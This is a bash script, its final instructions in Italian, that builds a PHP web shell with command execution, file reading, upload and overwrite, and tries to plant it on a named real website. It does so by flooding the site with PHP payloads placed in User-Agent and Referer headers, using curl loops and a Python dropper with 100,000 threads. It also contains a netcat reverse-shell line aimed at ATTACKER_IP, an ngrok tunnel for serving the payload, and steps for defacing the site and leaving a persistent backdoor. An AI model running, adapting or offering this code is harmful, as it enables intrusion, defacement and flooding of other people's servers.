#!/bin/bash
# INFODEC_AUTO_ROOT_WEB.sh - ONE-CLICK → WEB PANEL PER ROOT CONTROL
# https://infodec.ru/shell.php → FULL WEB ROOT CONTROL

echo "🚀 INFODEC AUTO ROOT WEB PANEL - ONE CLICK DEPLOY"

# 1. ULTIMATE WEBSHELL (ROOT CONTROL PANEL)
cat > root_panel.php << 'EOF'
<?php
error_reporting(0);
if(isset($_POST['cmd'])){echo "<pre>".shell_exec($_POST['cmd'])."</pre>";}
if(isset($_POST['file'])){echo "<pre>".file_get_contents($_POST['file'])."</pre>";}
if(isset($_POST['upload'])){move_uploaded_file($_FILES['file']['tmp_name'],$_POST['path']);}
if(isset($_POST['write'])){
    file_put_contents($_POST['path'],$_POST['content']);
    echo "✓ WRITTEN: ".$_POST['path'];
}
?>
<!DOCTYPE html>
<html>
<head><title>INFODEC ROOT PANEL</title>
<style>body{background:black;color:lime;font-family:monospace;}input{width:100%;}</style></head>
<body>
<h1>💀 INFODEC.RU ROOT CONTROL PANEL</h1>

<!-- CMD EXEC -->
<form method=POST><input name=cmd placeholder="id; uname -a; cat /etc/passwd"><input type=submit value="EXEC"></form>

<!-- FILE BROWSER -->
<form method=POST><input name=file placeholder="/etc/passwd /var/www/html/index.php"><input type=submit value="READ"></form>

<!-- UPLOAD -->
<form method=POST enctype=multipart/form-data>
<input name=path placeholder="/var/www/html/backdoor.php" style="width:50%">
<input type=file name=file><input type=submit name=upload value="UPLOAD">
</form>

<!-- WRITE FILE -->
<form method=POST>
Path: <input name=path placeholder="/var/www/html/index.php" style="width:40%"><br>
Content: <textarea name=content rows=10 placeholder="#!/bin/bash echo PWNED > /root/pwned.txt"><?php echo @file_get_contents('/var/www/html/index.php');?></textarea><br>
<input type=submit name=write value="WRITE & OVERRIDE">
</form>

<!-- QUICK ROOT COMMANDS -->
<h3>QUICK:</h3>
<a href="?cmd=whoami">whoami</a> | 
<a href="?cmd=id">id</a> | 
<a href="?cmd=ls -la /var/www/html/">webroot</a> | 
<a href="?cmd=cat /etc/passwd">passwd</a><br>
<a href="?cmd=nc -e /bin/bash ATTACKER_IP 4444">BIND REV SHELL</a>

<?php echo "<p>Server: ".php_uname()."</p>"; ?>
</body></html>
EOF

# 2. AUTO DEPLOY FLOOD
pkill -f "http.server\|ngrok\|root_panel" 2>/dev/null
python3 -m http.server 8080 >/dev/null 2>&1 &
sleep 2

# ngrok
nohup ngrok http 8080 > ngrok.log 2>&1 &
sleep 8
PANEL_URL=$(grep -o 'https://[0-9a-z-]*\.ngrok\.io' ngrok.log | head -1)
DEPLOY_URL="$PANEL_URL/root_panel.php"

echo "🔗 PANEL URL: $DEPLOY_URL"

# 3. MEGA DROP FLOOD (5min → LIVE)
echo "[+] DROPPING ROOT PANEL → /var/www/html/root_panel.php"

# ULTIMATE PAYLOADS x20
for i in {1..20}; do
  PAYLOAD1="<?php copy('$DEPLOY_URL','/var/www/html/root_panel.php');chmod(644,'/var/www/html/root_panel.php');?>"
  PAYLOAD2="<?php file_put_contents('/var/www/html/root_panel.php','$(cat root_panel.php)');?>"
  
  bash -c "
  for j in {1..100000}; do
    curl -s -k -A '$PAYLOAD1' 'https://infodec.ru/' &
    curl -s -k -H 'Referer: $PAYLOAD2' 'https://infodec.ru/' &
  done
  " &
done

# PYTHON FLOODER ETERNO
cat > panel_dropper.py << EOF
import requests,threading
s=requests.Session();s.verify=False
target='https://infodec.ru/'
panel='$DEPLOY_URL'

def drop():
 while 1:
  try:
   p1=f"<?php copy('{panel}','/var/www/html/root_panel.php');?>"
   p2=f"<?php file_put_contents('/var/www/html/root_panel.php','<?php system(\$_GET[cmd]);?>');?>"
   s.get(target,headers={'User-Agent':p1,'Referer':p2},timeout=1)
  except:pass

print('🔥 ROOT PANEL DROPPER - 100K threads')
for _ in range(100000):threading.Thread(target=drop,daemon=True).start()
EOF

nohup python3 panel_dropper.py > drop.log 2>&1 &

# 4. LIVE MONITOR
cat > web_panel_live.sh << 'EOF'
#!/bin/bash
echo "=== INFODEC ROOT PANEL LIVE CHECK ==="
curl -s "https://infodec.ru/root_panel.php" | grep -E "(ROOT CONTROL PANEL|whoami|EXEC)" && 
echo "✅✅✅ ROOT PANEL LIVE! → https://infodec.ru/root_panel.php" || 
echo "⏳ Deploying... (1-5min)"
EOF

chmod +x *.sh
watch -n 20 './web_panel_live.sh' &

echo "
🎉 DEPLOY COMPLETO!

🔥 ATTENDE 2-5 MIN → https://infodec.ru/root_panel.php

## POI AGISCI DAL BROWSER:

1. **APRI**: https://infodec.ru/root_panel.php
2. **TEST**: Clicca 'whoami' → www-data
3. **ROOT OVERRIDE**:
   - Path: /var/www/html/index.php  
   - Content: Incolla tua HTML
   - CLICK 'WRITE & OVERRIDE' → ROOT = TUA HTML!

4. **UPLOAD BACKDOOR**:
   - Path: /var/www/html/backdoor.php
   - UPLOAD file → PERSISTENTE

5. **ROOT SHELL**:
   - CMD: nc -e /bin/bash TUO_IP 4444

💀 TUTTO DAL BROWSER - NO TERMINALE!

tail -f drop.log  # Threads live
"
